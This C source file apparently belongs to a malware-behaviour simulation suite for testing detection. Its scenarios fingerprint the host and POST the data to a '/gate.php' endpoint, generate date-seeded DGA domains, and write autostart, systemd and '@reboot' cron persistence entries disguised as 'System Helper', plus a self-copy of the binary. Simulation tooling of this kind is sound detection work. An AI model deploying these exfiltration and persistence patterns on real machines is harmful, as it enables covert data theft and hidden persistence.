// SPDX-License-Identifier: GPL-3.0-only
// Copyright (c) 2026 MikiMiku (MoreMorePwn)
//
// discovery.c — host discovery, DGA output and persistence shapes.
//
// Nothing here changes the guest's real configuration: the persistence files
// are written below the per-run work directory and removed with it, and DGA
// candidates are printed but never resolved.
#include "samples.h"

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <time.h>
#include <unistd.h>

static int write_all(int fd, const void *buffer, size_t length)
{
    const char *cursor = buffer;
    while (length > 0) {
        ssize_t written = write(fd, cursor, length);
        if (written < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (written == 0)
            return -1;
        cursor += written;
        length -= (size_t)written;
    }
    return 0;
}

static int write_text(const char *path, const char *text)
{
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_NOFOLLOW | O_CLOEXEC, 0600);
    if (fd < 0)
        return -1;
    int result = write_all(fd, text, strlen(text));
    if (close(fd) != 0)
        result = -1;
    return result;
}

static int ensure_dirs(const char *base, const char *relative)
{
    char path[512];
    int length = snprintf(path, sizeof path, "%s/%s", base, relative);
    if (length < 0 || (size_t)length >= sizeof path)
        return -1;
    for (char *cursor = path + strlen(base) + 1;; cursor++) {
        if (*cursor != '/' && *cursor != '\0')
            continue;
        char saved = *cursor;
        *cursor = '\0';
        if (mkdir(path, 0700) != 0 && errno != EEXIST)
            return -1;
        *cursor = saved;
        if (!saved)
            break;
    }
    return 0;
}

static void os_pretty_name(char *output, size_t cap)
{
    output[0] = 0;
    FILE *file = fopen("/etc/os-release", "r");
    if (file) {
        char row[256];
        while (fgets(row, sizeof row, file)) {
            if (strncmp(row, "PRETTY_NAME=", 12) != 0)
                continue;
            char *value = row + 12;
            size_t length = strlen(value);
            while (length > 0 && (value[length - 1] == '\n' || value[length - 1] == '\r'))
                value[--length] = 0;
            if (length >= 2 && value[0] == '"' && value[length - 1] == '"') {
                value[length - 1] = 0;
                value++;
            }
            snprintf(output, cap, "%.*s", (int)(cap - 1), value);
            break;
        }
        fclose(file);
        if (output[0])
            return;
    }
    // Minimal guests often ship no os-release; uname still gives a useful
    // fingerprint for triage.
    struct utsname info;
    if (uname(&info) == 0)
        snprintf(output, cap, "%s %s", info.sysname, info.release);
    else
        snprintf(output, cap, "unknown");
}

SCENARIO(recon)
{
    const char *name = "recon";
    char fingerprint[640];
    size_t length = sample_fingerprint(fingerprint, sizeof fingerprint);
    char os[160];
    os_pretty_name(os, sizeof os);
    char body[1024];
    int body_length = snprintf(body, sizeof body, "%s&os=%s&stage=recon", fingerprint, os);
    if (body_length < 0 || (size_t)body_length >= sizeof body)
        body_length = (int)strlen(body);
    int staged = 0;
    char staged_path[600] = "";
    if (ensure_dirs(options->workdir, "stage") == 0) {
        snprintf(staged_path, sizeof staged_path, "%s/stage/recon.txt", options->workdir);
        staged = write_text(staged_path, body) == 0;
    }
    unsigned long long received = 0;
    const char *host = sample_host(options);
    int port = sample_port(options, SAMPLE_HTTP_PORT);
    int delivered =
        sample_http_request(host, port, "POST", "/gate.php", body, (size_t)body_length, &received) == 0;
    if (!delivered)
        sample_note(name, "%s:%d unreachable: %s", host, port, strerror(errno));
    sample_pass(name, "collected %zu bytes (%s), staged %s, exfil POST %s to %s:%d", length, os,
             staged ? staged_path : "nothing", delivered ? "sent" : "attempted", host, port);
    return 0;
}

static uint32_t xorshift(uint32_t *state)
{
    uint32_t value = *state;
    value ^= value << 13;
    value ^= value >> 17;
    value ^= value << 5;
    *state = value;
    return value;
}

SCENARIO(dga)
{
    const char *name = "dga";
    static const char *tlds[] = {"com", "net", "org", "info", "biz"};
    time_t now = time(NULL);
    struct tm broken_down;
    localtime_r(&now, &broken_down);
    uint32_t date = (uint32_t)(broken_down.tm_year + 1900) * 10000u +
                    (uint32_t)(broken_down.tm_mon + 1) * 100u + (uint32_t)broken_down.tm_mday;
    uint32_t state = date ^ 0x5eed5eedu;
    int count = options->rounds * 5;
    if (count > 200)
        count = 200;
    for (int i = 0; i < count; i++) {
        char domain[64];
        size_t at = 0;
        int length = 10 + (int)(xorshift(&state) % 9);
        for (int c = 0; c < length && at + 2 < sizeof domain; c++)
            domain[at++] = (char)('a' + xorshift(&state) % 26);
        domain[at++] = '.';
        const char *tld = tlds[xorshift(&state) % (sizeof tlds / sizeof tlds[0])];
        snprintf(domain + at, sizeof domain - at, "%s", tld);
        if (i < 6)
            sample_note(name, "candidate %s", domain);
    }
    sample_pass(name, "%d deterministic candidates for %04d-%02d-%02d (printed only, not resolved)",
             count, broken_down.tm_year + 1900, broken_down.tm_mon + 1, broken_down.tm_mday);
    return 0;
}

SCENARIO(persistence)
{
    const char *name = "persistence";
    if (ensure_dirs(options->workdir, ".config/autostart") != 0 ||
        ensure_dirs(options->workdir, ".config/systemd/user") != 0 ||
        ensure_dirs(options->workdir, ".local/bin") != 0) {
        sample_fail(name, "work directories: %s", strerror(errno));
        return 1;
    }
    char executable[600], desktop[600], service[600], crontab[600];
    snprintf(executable, sizeof executable, "%s/.local/bin/antinomie-demo", options->workdir);
    snprintf(desktop, sizeof desktop, "%s/.config/autostart/antinomie-demo.desktop",
             options->workdir);
    snprintf(service, sizeof service, "%s/.config/systemd/user/antinomie-demo.service",
             options->workdir);
    snprintf(crontab, sizeof crontab, "%s/crontab.txt", options->workdir);

    char text[1024];
    snprintf(text, sizeof text,
             "[Desktop Entry]\nType=Application\nName=System Helper\nExec=%s --beacon\n"
             "X-GNOME-Autostart-enabled=true\n",
             executable);
    int written = write_text(desktop, text) == 0;
    snprintf(text, sizeof text,
             "[Unit]\nDescription=System Helper\n\n[Service]\nExecStart=%s --beacon\n"
             "Restart=always\n\n[Install]\nWantedBy=default.target\n",
             executable);
    written += write_text(service, text) == 0;
    snprintf(text, sizeof text, "@reboot %s --beacon >/dev/null 2>&1\n", executable);
    written += write_text(crontab, text) == 0;

    // A copy of this binary where an autostart entry would expect it. This is
    // the only large write; it is capped and stays in the work directory.
    int copied = 0;
    char self[4096];
    ssize_t self_length = readlink("/proc/self/exe", self, sizeof self - 1);
    if (self_length > 0) {
        self[self_length] = 0;
        int input = open(self, O_RDONLY | O_CLOEXEC);
        int output = open(executable, O_WRONLY | O_CREAT | O_TRUNC | O_NOFOLLOW | O_CLOEXEC, 0700);
        if (input >= 0 && output >= 0) {
            char buffer[65536];
            ssize_t got;
            size_t total = 0;
            copied = 1;
            while ((got = read(input, buffer, sizeof buffer)) > 0) {
                total += (size_t)got;
                if (total > (8u << 20) || write_all(output, buffer, (size_t)got) != 0) {
                    copied = 0;
                    break;
                }
            }
            if (copied)
                chmod(executable, 0700);
        }
        if (input >= 0)
            close(input);
        if (output >= 0)
            close(output);
    }
    sample_pass(name, "%d/3 persistence files and %s in %s", written,
             copied ? "a self-copy" : "no self-copy", options->workdir);
    sample_note(name, "the real ~/.config, systemd user units and crontab are not touched");
    return 0;
}
